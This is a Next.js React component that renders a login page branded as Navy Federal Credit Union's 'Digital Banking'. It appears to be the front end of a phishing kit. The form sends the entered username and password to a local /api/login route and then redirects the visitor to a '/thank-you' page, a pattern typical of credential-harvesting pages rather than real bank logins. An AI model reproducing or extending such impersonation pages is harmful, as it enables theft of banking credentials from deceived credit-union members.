
"use client"
import axios from "axios";
import Image from "next/image";
import { useState } from "react";

export default function Main() {

  const [isLoading, setIsLoading] = useState(false)
    const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

const handleSubmit = async (event: { preventDefault: () => void; }) => {
  event.preventDefault();
  if(!username && !password){
    return alert("login required")
  }
  setIsLoading(true);

  try {
    const response = await axios.post('/api/login', {
      username,
      password
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });

    const data = response.data; // Use.data property to access the response body
    console.log(data);

    // if successful navigate to thank you page
    // window.location.href = '/thank-you';
      if (response.status >= 200 && response.status < 300) {
        window.location.href = '/thank-you';
   }
    // 



    // Clear username and password fields
    setUsername('');
    setPassword('');
  } catch (error) {
    console.error(error);
    // Optionally, handle errors here
  } finally {
    setIsLoading(false);
  }
};

  return (
    
    <main style={{
      fontFamily: 'Arial, sans-serif',
      backgroundImage: "url('/assets/background.png')",
      backgroundSize: 'cover',
      backgroundRepeat: 'no-repeat',
      backgroundPosition: 'center',
      height: '100%', // Example height, adjust as needed
              width: '100%', // Example width, adjust as needed
      zIndex:9999}}
      >
      <div>
        <img src="/assets/nfcu.jpg" alt="logo" className="w-full"  />
      </div>
      <div className="flex justify-center items-center text-3xl font-bold  text-blue-900 mt-20">
        <h1>Welcome to Digital Banking</h1>
      </div>

    <div className="container w-full sm:w-[60%] md:w-[60%] lg:w-[30%] mx-auto mt-27 px-4">
      <div className="flex flex-col items-center justify-center space-y-4 p-3 rounded-md shadow-xl border border-gray-100">
          <img className="w-64" src="assets/navy.jpg" alt="Navy Federal Credit Union Logo" />
          
          <form onSubmit={handleSubmit} className=" space-y-4 p-3 rounded-md shadow-x1">
        <input
          type="text"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          placeholder="Username"
          className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
        />
        <input
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          placeholder="Password"
          className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
        />
        <button
          disabled={isLoading}
          className={`w-full ${isLoading? "bg-gray-400 cursor-not-allowed py-2 px-4" : "bg-[#1c3666] hover:bg-[#313d79] text-white font-bold py-2 px-4 rounded"}`}
        >
          {isLoading? (
            <div className="flex items-center justify-center">
              <div className="animate-spin rounded-full h-6 w-6 border-t-2 border-b-2 border-white"></div>
            </div>
          ) : (
            "Login"
          )}
        </button>
      </form>
        </div>
        </div>
   </main>
  );
}
